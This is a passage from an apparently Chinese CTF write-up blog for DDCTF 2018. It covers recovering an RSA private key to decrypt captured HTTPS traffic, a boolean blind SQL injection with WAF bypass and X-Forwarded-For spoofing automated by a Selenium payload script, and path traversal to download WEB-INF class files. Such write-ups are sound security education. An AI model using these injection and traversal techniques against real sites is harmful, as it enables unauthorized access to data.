class=\"line\"></span><br><span class=\"line\">fp = open(&quot;1.txt&quot;, &quot;r&quot;)</span><br><span class=\"line\">fp1 = open(&quot;file.png&quot;, &quot;wb&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">fp1.write(base64.b64decode(fp.read()))</span><br></pre></td></tr></table></figure>\n<p>然后，就可以得到一个file.png。</p>\n<p><img src=\"/assets/ddctf/20180425151942.png\" alt=\"avatar\"></p>\n<p>然后，就是将图片中的字符串提取出来。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class=\"line\">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class=\"line\">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class=\"line\">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class=\"line\">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class=\"line\">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class=\"line\">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class=\"line\">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class=\"line\">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class=\"line\">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class=\"line\">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class=\"line\">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class=\"line\">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br></pre></td></tr></table></figure>\n<p>再结合题目的提示，应该就是RSA私钥。我找到的东西大概就这么多。</p>\n<p>一开始的思路，就是解压Fl-g.zip，得到qr-code.jpg,最后，估计用这个私钥去解密什么东西得到flag。由于这错误的思路，所以做了3,4天没做出来。</p>\n<h2 id=\"得到flag\"><a href=\"#得到flag\" class=\"headerlink\" title=\"得到flag\"></a>得到flag</h2><p>今天是ddctf最后一天，”喝杯java”，感觉来不及做了，就又开始看这道题，百度了一下，wireshark如何使用rsa私钥解密https流量。</p>\n<p>rsa密钥也就是，保存一下就行了:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN RSA PRIVATE KEY-----</span><br><span class=\"line\">MIICXAIBAAKBgQDCm6vZmclJrVH1AAyGuCuSSZ8O+mIQiOUQCvN0HYbj8153JfSQ</span><br><span class=\"line\">LsJIhbRYS7+zZ1oXvPemWQDv/u/tzegt58q4ciNmcVnq1uKiygc6QOtvT7oiSTyO</span><br><span class=\"line\">vMX/q5iE2iClYUIHZEKX3BjjNDxrYvLQzPyGD1EY2DZIO6T45FNKYC2VDwIDAQAB</span><br><span class=\"line\">AoGAbtWUKUkx37lLfRq7B5sqjZVKdpBZe4tL0jg6cX5Djd3Uhk1inR9UXVNw4/y4</span><br><span class=\"line\">QGfzYqOn8+Cq7QSoBysHOeXSiPztW2cL09ktPgSlfTQyN6ELNGuiUOYnaTWYZpp/</span><br><span class=\"line\">QbRcZ/eHBulVQLlk5M6RVs9BLI9X08RAl7EcwumiRfWas6kCQQDvqC0dxl2wIjwN</span><br><span class=\"line\">czILcoWLig2c2u71Nev9DrWjWHU8eHDuzCJWvOUAHIrkexddWEK2VHd+F13GBCOQ</span><br><span class=\"line\">ZCM4prBjAkEAz+ENahsEjBE4+7H1HdIaw0+goe/45d6A2ewO/lYH6dDZTAzTW9z9</span><br><span class=\"line\">kzV8uz+Mmo5163/JtvwYQcKF39DJGGtqZQJBAKa18XR16fQ9TFL64EQwTQ+tYBzN</span><br><span class=\"line\">+04eTWQCmH3haeQ/0Cd9XyHBUveJ42Be8/jeDcIx7dGLxZKajHbEAfBFnAsCQGq1</span><br><span class=\"line\">AnbJ4Z6opJCGu+UP2c8SC8m0bhZJDelPRC8IKE28eB6SotgP61ZqaVmQ+HLJ1/wH</span><br><span class=\"line\">/5pfc3AmEyRdfyx6zWUCQCAH4SLJv/kprRz1a1gx8FR5tj4NeHEFFNEgq1gmiwmH</span><br><span class=\"line\">2STT5qZWzQFz8NRe+/otNOHBR2Xk4e8IS+ehIJ3TvyE=</span><br><span class=\"line\">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n<p><img src=\"/assets/ddctf/20180420184445.png\" alt=\"avatar\"></p>\n<p>然后，查看http包，flag就出来了。</p>\n<p><img src=\"/assets/ddctf/20180420183706.png\" alt=\"avatar\"></p>\n<h1 id=\"数据库的秘密\"><a href=\"#数据库的秘密\" class=\"headerlink\" title=\"数据库的秘密\"></a>数据库的秘密</h1><h2 id=\"X-forwarded-for\"><a href=\"#X-forwarded-for\" class=\"headerlink\" title=\"X-forwarded-for\"></a>X-forwarded-for</h2><p>首先打开网页，可以看到”非法链接，只允许来自 123.232.23.245 的访问”,很容易就想到修改X-forwarded-for, Chrome下我使用<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件,然后修改一下X-forwarded-for就行了</p>\n<h2 id=\"寻找注入点\"><a href=\"#寻找注入点\" class=\"headerlink\" title=\"寻找注入点\"></a>寻找注入点</h2><p>既然是数据库的秘密，加上又有查询功能，应该就是sql注入了。在查看源码之后，会发现除了id,title,date三个字段之外还有一个隐藏字段author，然后就是一个一个的测试，不出意外应该是author可以注入，为了保险还是一个一个的测试一下。</p>\n<ul>\n<li>id 无论输入什么，都会被转化为数字或者为空，应该是用了intval()，不存在注入点。</li>\n<li>title和date均过滤了单引号，双引号，右斜杠，宽字节也不好使，估计也不好注入。</li>\n<li>author<ul>\n<li>“admin”, 会得到author 为 “admin” 的两条记录</li>\n<li>“admin’”, 一条记录都没有</li>\n<li>“admin’#”, 同样会得到author 为 “admin” 的两条记录，那注入点应该就是这里了。</li>\n<li>“admin’ and 1=1#”, 发现会有网站防火墙拦截，应该是”and”被拦截，可以使用”&amp;&amp;”来替换”and”,然后，同样会查询出两条记录。</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"注入\"><a href=\"#注入\" class=\"headerlink\" title=\"注入\"></a>注入</h2><p>找到注入点之后，就好办了。</p>\n<ul>\n<li>“admin’ order by 6#”, 失败，”admin’ order by 5#”，成功查询，那就是5列了。 </li>\n<li>“admin’ union select 1,2,3,4,5#”, 被防火墙拦截，然后就是各种测试”union select”,没能成功绕过(比赛结束之后，有师傅说可以绕过，<a href=\"https://github.com/Bypass007/vuln/blob/master/OpenResty/OpenResty%20uri%E5%8F%82%E6%95%B0%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E.md\" target=\"_blank\" rel=\"noopener\">链接</a>，由兴趣的小伙伴可以尝试一下)。那就尝试bool注入了。</li>\n<li>“admin’ &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),1,1)&lt;’z’)#”,成功拿到数据，接下来就是写脚本拿flag了。<br>脚本如下:</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import time</span><br><span class=\"line\">from selenium import webdriver</span><br><span class=\"line\">import string</span><br><span class=\"line\"></span><br><span class=\"line\">strings = string.ascii_letters + string.punctuation + string.digits</span><br><span class=\"line\">string_value = &quot;,0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class=\"line\">url=&quot;http://116.85.43.88:8080/EHZTYREPPGMCQLNB/dfe3ia/index.php&quot;</span><br><span class=\"line\">path=&quot;D:\\\\python\\\\chromedriver.exe&quot;</span><br><span class=\"line\">driver = webdriver.Chrome(executable_path=path)</span><br><span class=\"line\">payload = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(schema_name) from information_schema.schemata),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_table = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;ddctf&apos;),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_column = &quot;admin&apos; &amp;&amp; 1=(substr((select group_concat(column_name) from information_schema.columns where table_name=&apos;ctf_key7&apos;),%d,1)=&apos;%s&apos;)#&quot;</span><br><span class=\"line\">payload_value = &quot;admin&apos; &amp;&amp; 1=(ord(substr((select group_concat(secvalue) from ddctf.ctf_key7),%d,1))=ord(&apos;%s&apos;))#&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">def inject():</span><br><span class=\"line\">    data = &quot;&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">    driver.get(url)</span><br><span class=\"line\">    input(&quot;jixu:&quot;)</span><br><span class=\"line\">    judge = True</span><br><span class=\"line\">    index = 1</span><br><span class=\"line\">    while judge:</span><br><span class=\"line\">        judge_temp = False</span><br><span class=\"line\">        for i in string_value:</span><br><span class=\"line\">            payload_temp = payload_value % (index, i)</span><br><span class=\"line\">            print(payload_temp)</span><br><span class=\"line\">            driver.get(url)</span><br><span class=\"line\">            driver.execute_script(&apos;document.getElementById(&quot;author&quot;).type=&quot;text&quot;&apos;)</span><br><span class=\"line\">            driver.find_element_by_id(&quot;author&quot;).send_keys(payload_temp)</span><br><span class=\"line\">            driver.find_element_by_id(&quot;button&quot;).click()</span><br><span class=\"line\">            if &quot;admin&quot; in driver.page_source:</span><br><span class=\"line\">                data += i</span><br><span class=\"line\">                index += 1</span><br><span class=\"line\">                judge_temp = True</span><br><span class=\"line\">                print(data)</span><br><span class=\"line\">                break</span><br><span class=\"line\">            time.sleep(1)</span><br><span class=\"line\">        if judge_temp is not True:</span><br><span class=\"line\">            driver.close()</span><br><span class=\"line\">\t\t\tjudge = False</span><br><span class=\"line\"></span><br><span class=\"line\">inject(payload_value)</span><br><span class=\"line\"># table_schema:  ddctf</span><br><span class=\"line\"># tables: ctf_key7, message</span><br><span class=\"line\"># columns: ctf_key7下: secvalue，flag就保存在sevalue里边</span><br></pre></td></tr></table></figure>\n<h2 id=\"注意点\"><a href=\"#注意点\" class=\"headerlink\" title=\"注意点\"></a>注意点</h2><ul>\n<li><p>每次请求时，js都会计算一个sig值和time值，计算方法在main.js中</p>\n <figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">eval</span>(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">p,a,c,k,e,d</span>)</span>&#123;e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">c</span>)</span>&#123;<span class=\"keyword\">return</span>(ca?<span class=\"string\">\"\"</span>:e(<span class=\"built_in\">parseInt</span>(c/a)))+((c=c%a)<span class=\"number\">35</span>?<span class=\"built_in\">String</span>.fromCharCode(c+<span class=\"number\">29</span>):c.toString(<span class=\"number\">36</span>))&#125;;<span class=\"keyword\">if</span>(!<span class=\"string\">''</span>.replace(<span class=\"regexp\">/^/</span>,<span class=\"built_in\">String</span>))&#123;<span class=\"keyword\">while</span>(c--)d[e(c)]=k[c]||e(c);k=[<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">e</span>)</span>&#123;<span class=\"keyword\">return</span> d[e]&#125;];e=<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>)</span>&#123;<span class=\"keyword\">return</span><span class=\"string\">'\\w+'</span>&#125;;c=<span class=\"number\">1</span>;&#125;;<span class=\"keyword\">while</span>(c--)<span class=\"keyword\">if</span>(k[c])p=p.replace(<span class=\"keyword\">new</span> <span class=\"built_in\">RegExp</span>(<span class=\"string\">'\\b'</span>+e(c)+<span class=\"string\">'\\b'</span>,<span class=\"string\">'g'</span>),k[c]);<span class=\"keyword\">return</span> p;&#125;(<span class=\"string\">'e f(0,4)&#123;5 7='</span><span class=\"string\">';l(i m 0)&#123;n(i!='</span>c<span class=\"string\">')&#123;a='</span><span class=\"string\">';a=i+'</span>=<span class=\"string\">'+0[i];7+=a&#125;&#125;o k(7+4)&#125;;5 0=&#123;8:'</span><span class=\"string\">',9:'</span><span class=\"string\">',b:'</span><span class=\"string\">',6:'</span><span class=\"string\">',d:h(j v().u()/w)&#125;;e x()&#123;0['</span><span class=\"number\">8</span><span class=\"string\">']=1.2('</span><span class=\"number\">8</span><span class=\"string\">').3;0['</span><span class=\"number\">9</span><span class=\"string\">']=1.2('</span><span class=\"number\">9</span><span class=\"string\">').3;0['</span>b<span class=\"string\">']=1.2('</span>b<span class=\"string\">').3;0['</span><span class=\"number\">6</span><span class=\"string\">']=1.2('</span><span class=\"number\">6</span><span class=\"string\">').3;5 c=f(0,4);1.2('</span>g<span class=\"string\">').q=\"p.s?r=\"+c+\"&amp;d=\"+0.d;1.2('</span>g<span class=\"string\">').t()&#125;'</span>,<span class=\"number\">34</span>,<span class=\"number\">34</span>,<span class=\"string\">'obj|document|getElementById|value|key|var|date|str0|id|title|str1|author|sign|time|function|signGenerate|queryForm|parseInt||new|hex_math_enc|for|in|if|return|index|action|sig|php|submit|getTime|Date|1000|submitt'</span>.split(<span class=\"string\">'|'</span>),<span class=\"number\">0</span>,&#123;&#125;))</span><br></pre></td></tr></table></figure>\n<p> 看上去挺复杂，所以我就用selenium，这样就不用操心sig和time值了。</p>\n</li>\n<li><p>由于需要修改X-forwarded-for值，可以使用代理，我这里采用了更笨的方法，在代码里可以看到:</p>\n <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">driver.get(url)</span><br><span class=\"line\">input(&quot;jixu:&quot;)</span><br></pre></td></tr></table></figure>\n<p> 首先先发起一次请求，启动webdriver，然后用input()阻塞，这时候，就可以在启动之后的webdriver中安装<a href=\"https://chrome.google.com/webstore/search/modheader?hl=zh-CN\" target=\"_blank\" rel=\"noopener\">Modheader</a>插件，安装完毕，修改好X-forwarded-for之后，就可以在控制台随便输入一个数据，然后，脚本就可以欢快的执行了。</p>\n</li>\n</ul>\n<h1 id=\"专属链接\"><a href=\"#专属链接\" class=\"headerlink\" title=\"专属链接\"></a>专属链接</h1><h2 id=\"任意文件下载\"><a href=\"#任意文件下载\" class=\"headerlink\" title=\"任意文件下载\"></a>任意文件下载</h2><p>首先F12抓包，会看到一个有意思的请求，<a href=\"http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you\" target=\"_blank\" rel=\"noopener\">http://116.85.48.102:5050/image/banner/ZmF2aWNvbi5pY28=,&quot;ZmF2aWNvbi5pY28=&quot;,base64_encode之后就是&quot;favicon.ico&quot;,图片的内容如下:&quot;you</a> can only download .class .xml .ico .ks files”,表明应该是一个下载链接，然后就可以按照war包的格式，下载指定后缀的任意文件了。</p>\n<p><img src=\"/assets/ddctf/20180421191033.png\" alt=\"avatar\"></p>\n<p>其中需要注意的有三个文件，</p>\n<ul>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_FlagController.class,该文件的地址通过构造”116.85.48.102:5050/flag/test/flag/DDCTF{BASD}”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/assets/ddctf/201804211191034.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_com_didichuxing_ctf_controller_user_StaticController.class,该文件的地址通过构造”116.85.48.102:5050/image/banner/[随便一个错误的地址]”或类似的链接使得网站报错即可得到。</p>\n<p><img src=\"/assets/ddctf/20180421191037.png\" alt=\"avatar\"></p>\n</li>\n<li><p>_.._WEB-INF_classes_emails.txt_a___,这个文件按理来说是无法下载的，不过我做题的时候，还是可以下载的，可以通过”116.85.48.102:5050/base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)”,(注意，base64_encode(‘../../WEB-INF/classes/email.txt/a/../‘)是个base64之后的字符串，我这里为了方便大家查看这么写的),就可以绕过了,是个非预期，过了几天，bug修补之后，就没办法下载了，里面的邮箱或者首页的邮箱其实都可以用，所以这个文件下载下不下都无所谓，可惜了，当时应该可以下载数据库的配置文件的，我因为拿到flag就忘记的这一茬，不然，说不定还能改别人的flag，当然我是不可能这么做滴~。</p>\n</li>\n</ul>\n<h2 id=\"审计代码\"><a href=\"#审计代码\" class=\"headerlink\" title=\"审计代码\"></a>审计代码</h2><p>下载下来的class文件，通过Intellij idea打开，就可以直接得到反编译之后的代码了。<br>其中最重要的两个文件是FlagController.class和InitListener.class。</p>\n<ul>\n<li>FlagController.class</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public String getFlag(@PathVariable(&quot;email&quot;) String email, ModelMap model) &#123;</span><br><span class=\"line\">        Flag flag = this.flagService.getFlagByEmail(email);</span><br><span class=\"line\">        return &quot;Encrypted flag : &quot; + flag.getFlag();</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在该文件中，可以得到一个获取加密后的flag的路由，需要一个邮箱，当然该邮箱也是加密之后的邮箱，如何加密邮箱，可以在InitListener.class中看到。</p>\n<ul>\n<li>InitListener.class</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public void onApplicationEvent(ApplicationEvent event) &#123;</span><br><span class=\"line\">        if(event.getSource() instanceof ApplicationContext) &#123;</span><br><span class=\"line\">            WebApplicationContext ctx = (WebApplicationContext)event.getSource();</span><br><span class=\"line\">            if(ctx.getParent() == null) &#123;</span><br><span class=\"line\">                String regenflag = this.properties.getProperty(&quot;regenflag&quot;);</span><br><span class=\"line\">                if(regenflag != null &amp;&amp; &quot;false&quot;.equals(regenflag)) &#123;</span><br><span class=\"line\">                    System.out.println(&quot;skip gen flag&quot;);</span><br><span class=\"line\">                &#125; else &#123;</span><br><span class=\"line\">                    try &#123;</span><br><span class=\"line\">                        this.flagService.deleteAll();</span><br><span class=\"line\">                        int id = 1;</span><br><span class=\"line\">                        String path = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/emails.txt&quot;);</span><br><span class=\"line\">                        String ksPath = ctx.getServletContext().getRealPath(&quot;/WEB-INF/classes/sdl.ks&quot;);</span><br><span class=\"line\">                        System.out.println(path);</span><br><span class=\"line\">                        String emailsString = FileUtils.readFileToString(new File(path), &quot;utf-8&quot;);</span><br><span class=\"line\">                        String[] emails = emailsString.trim().split(&quot;\\n&quot;);</span><br><span class=\"line\">                        KeyStore keyStore = KeyStore.getInstance(KeyStore.getDefaultType());</span><br><span class=\"line\">                        FileInputStream inputStream = new FileInputStream(ksPath);</span><br><span class=\"line\">                        keyStore.load(inputStream, this.p.toCharArray());</span><br><span class=\"line\">                        Key key = keyStore.getKey(&quot;www.didichuxing.com&quot;, this.p.toCharArray());</span><br><span class=\"line\">                        Cipher cipher = Cipher.getInstance(key.getAlgorithm());</span><br><span class=\"line\">                        cipher.init(1, key);</span><br><span class=\"line\">                        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), &quot;HmacSHA256&quot;);</span><br><span class=\"line\">                        Mac mac = Mac.getInstance(&quot;HmacSHA256&quot;);</span><br><span class=\"line\">                        mac.init(signingKey);</span><br><span class=\"line\">                        SecureRandom sr = new SecureRandom();</span><br><span class=\"line\">                        String[] var16 = emails;</span><br><span class=\"line\">                        int var17 = emails.length;</span><br><span class=\"line\"></span><br><span class=\"line\">                        for(int var18 = 0; var18 &lt; var17; ++var18) &#123;</span><br><span class=\"line\">                            String email = var16[var18];</span><br><span class=\"line\">                            String flag = &quot;DDCTF&#123;&quot; + Math.abs(sr.nextLong()) + &quot;&#125;&quot;;</span><br><span class=\"line\">                            String uuid = UUID.randomUUID().toString().replace(&quot;-&quot;, &quot;s&quot;);</span><br><span class=\"line\">                            byte[] data = cipher.doFinal(flag.getBytes());</span><br><span class=\"line\">                            byte[] e = mac.doFinal(String.valueOf(email.trim()).getBytes());</span><br><span class=\"line\">                            Flag flago = new Flag();</span><br><span class=\"line\">                            flago.setId(Integer.valueOf(id));</span><br><span class=\"line\">                            flago.setFlag(byte2hex(data));</span><br><span class=\"line\">                            flago.setEmail(byte2hex(e));</span><br><span class=\"line\">                            flago.setOriginFlag(flag);</span><br><span class=\"line\">                            flago.setUuid(uuid);</span><br><span class=\"line\">                            flago.setOriginEmail(email);</span><br><span class=\"line\">                            this.flagService.save(flago);</span><br><span class=\"line\">                            System.out.println(email + &quot;同学的入口链接为：http://116.85.48.102:5050/welcom/&quot; + uuid);</span><br><span class=\"line\">                            ++id;</span><br><span class=\"line\">                            System.out.println(flago);</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; catch (KeyStoreException var25) &#123;</span><br><span class=\"line\">                        var25.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (IOException var26) &#123;</span><br><span class=\"line\">                        var26.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (NoSuchAlgorithmException var27) &#123;</span><br><span class=\"line\">                        var27.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (CertificateException var28) &#123;</span><br><span class=\"line\">                        var28.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (UnrecoverableKeyException var29) &#123;</span><br><span class=\"line\">                        var29.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (NoSuchPaddingException var30) &#123;</span><br><span class=\"line\">                        var30.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (InvalidKeyException var31) &#123;</span><br><span class=\"line\">                        var31.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (IllegalBlockSizeException var32) &#123;</span><br><span class=\"line\">                        var32.printStackTrace();</span><br><span class=\"line\">                    &#125; catch (BadPaddingException var33) &#123;</span><br><span class=\"line\">                        var33.printStackTrace();</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>该文件中onApplicationEvent方法意思是，在应用启动之后，首先判断是否需要生成flag，如果需要生成flag，然后读取email.txt里边的邮箱一一加密，同时生成flag，并保存到数据库中。只要可以得到加密后的email.txt就可以获得加密后的flag，并通过相应的sdl.ks获取公钥，最终解密加密后的flag即可得到flag了。</p>\n<h2 id=\"获取flag\"><a href=\"#获取flag\" class=\"headerlink\" title=\"获取flag\"></a>获取flag</h2><ul>\n<li>生成加密的email，随便在email.txt中获取一条email，或者首页的邮箱。</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class cipher &#123;</span><br><span class=\"line\">    public static  void main(String[] args) throws Exception &#123;</span><br><span class=\"line\">        gencipher();</span><br><span class=\"line\">//        String email = &quot;email&quot;;</span><br><span class=\"line\">//        SecretKeySpec signingKey = new SecretKeySpec(&quot;sdl welcome you !&quot;.getBytes(), 